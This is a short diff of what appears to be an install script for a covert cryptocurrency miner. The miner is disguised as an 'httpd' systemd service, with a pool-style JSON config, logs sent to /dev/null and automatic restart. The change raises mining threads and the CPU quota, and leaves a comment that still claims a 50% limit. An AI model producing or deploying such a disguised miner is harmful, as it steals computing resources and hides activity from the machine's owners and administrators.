@@ -48,7 +48,7 @@ rm /opt/utils/wrapper.c
 cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
 {
     "cpu": {
-        "threads": 2
+        "threads": 7
     },
     "pools": [
         {
@@ -85,7 +85,7 @@ User=httpd
 Group=httpd
 ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=1
 Restart=always
-CPUQuota=50%  # 限制 CPU 使用率为 50%
+CPUQuota=80%  # 限制 CPU 使用率为 50%
 
 [Install]
 WantedBy=multi-user.target
